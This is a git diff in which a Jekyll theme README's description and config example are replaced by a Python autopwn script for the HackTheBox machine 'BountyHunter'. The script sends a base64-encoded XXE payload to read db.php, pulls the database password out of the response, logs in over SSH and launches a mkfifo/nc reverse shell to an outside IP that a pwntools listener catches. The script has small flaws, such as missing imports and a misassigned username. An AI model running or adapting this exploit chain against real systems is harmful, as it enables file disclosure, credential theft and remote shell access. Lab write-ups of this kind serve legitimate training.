@@ -6,55 +6,71 @@ layout: content
 
 [https://gjuniioor.github.io/clyell](https://gjuniioor.github.io/clyell)
 
-### About
+### BountyHunter - HackTheBox
 
-It's just one more [jekyll](https://github.com/jekyll/jekyll) theme. Maybe it's has some appearance like a linux console. :)
+~~~python
+#!/usr/bin/python3
+#coding: utf-8
 
-[Bootstrap](http://getbootstrap.com/) was added to turn responsible. Thanks, [@magnunleno](https://github.com/magnunleno).
+from pwn import *
+import requests
+import base64
+import re
+from pexpect import pxssh
+import html
 
-### Features
+#Variables globales
+main_url = "http://10.10.11.100/tracker_diRbPr00f314.php"
+#burp = {'http': 'http://127.0.0.1:8080'}
+lport = 443
 
-- [x] Google analytics
-- [x] Disqus
-- [x] Responsible
-- [x] Highlights for code
+def def_handler(sig, frame):
+    print("Saliendo...")
+    sys.exit(0)
+    signal.signal(signal.SIGINT, def_handler)
 
-### Characteristics
+def MakeRequest():
+    username = "development"
+    password = ""
+    #Coficacion en base64
+    xxe_payload = """<?xml  version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=db.php'>]> <bugreport> <title>&test;</title> <cwe>test</cwe> <cvss>test</cvss> <reward>test</reward> </bugreport>"""
+    xxe_payload_bytes = xxe_payload.encode('ascii')
+    base64_bytes = base64.b64encode(xxe_payload_bytes)
+    base64_xxe_payload = base64_bytes.decode('ascii')
 
-- [x] Customized (and nice :P) 404 page
-- [x] Simple
-- [x] Friendly to read
+    data_post = {
+        'data': base64_xxe_payload
+    }
 
-### Screenshots
+    r = requests.post(main_url, data=data_post)
+    db_file = html.unescape(re.findall(r'<td>(.*?)</td>', r.text, re.DOTALL)[1]).strip()
 
-![Screenshot]({{ site.baseurl }}images/screenshot/01.png)
+    #Decodificacion de archivo db.php en base64
+    base64_bytes = db_file.encode('ascii')
+    message_bytes = base64.b64decode(base64_bytes)
+    message = message_bytes.decode('ascii')
 
-![Screenshot]({{ site.baseurl }}images/screenshot/02.png)
+    password = re.findall(r'dbpassword = "(.*?)";', message)[0]
 
-### Config file example
+    return password
 
-~~~ yml
-# Site settings
-title: "gjuniioor"
-bye_message: "Thx!"
-baseurl: "/clyell/"
-url: "https://gjuniioor.github.io"
-disqus: gjuniioor
+def sshconnection(username, password):
+    s = pxssh.pxssh()
+    s.login('10.10.11.100', username, password)
+    s.sendline("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.19 443 >/tmp/f")
+    s.prompt()
+    s.logout()
 
-# Header settings
-nick: "gjuniioor"
-mail:
-    domain: "protonmail"
-    ext: "ch"
-source_code:
-    server: "github.com"
-    nick: "gjuniioor"
-blog:
-    server: "wordpress.com"
-    nick: "gjuniioor"
-fingerprint_key: "5E12 9ABC C2A9 564B C048  2DF9 D327 0D10 BC71 CF75"
+if __name__ == '__main__':
 
-# Build settings
-markdown: kramdown
-permalink: /:categories/:title/
+    password = MakeRequest()
+    username = MakeRequest()
+
+    try:
+        threading.Thread(target=sshconnection, args=('development', password)).start()
+    except Exception as e:
+        log.error(str(e))
+
+shell = listen(lport, timeout=20).wait_for_connection()
+shell.interactive()
 ~~~
